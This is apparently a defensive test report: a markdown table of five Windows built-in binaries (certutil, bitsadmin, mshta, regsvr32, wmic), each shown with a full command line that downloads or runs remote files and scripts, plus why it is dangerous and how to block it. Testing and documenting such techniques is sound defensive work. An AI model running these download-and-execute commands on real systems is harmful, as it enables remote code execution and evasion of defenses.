# LOLBAS Test Report

| Command | Status | Why it's dangerous | How to mitigate |
|--------|--------|--------------------|-----------------|
| certutil -urlcache -split -f https://example.com/file.txt file.txt | âœ… Passed | Can download malicious files over HTTP | Block certutil.exe for standard users |
| bitsadmin /transfer myJob https://example.com/file.txt file.txt | âœ… Passed | Transfers files silently, often overlooked | Block or audit bitsadmin |
| mshta https://example.com/malware.hta | âœ… Passed | Executes remote scripts, can bypass defenses | Block mshta.exe with AppLocker |
| regsvr32 /s /n /u /i:https://example.com/file.sct scrobj.dll | âœ… Passed | Runs remote scriptlets (SCT), no disk footprint | Block regsvr32 or restrict internet access |
| wmic process call create 'calc.exe' | âœ… Passed | Can execute any command or script | Limit wmic usage with group policies |
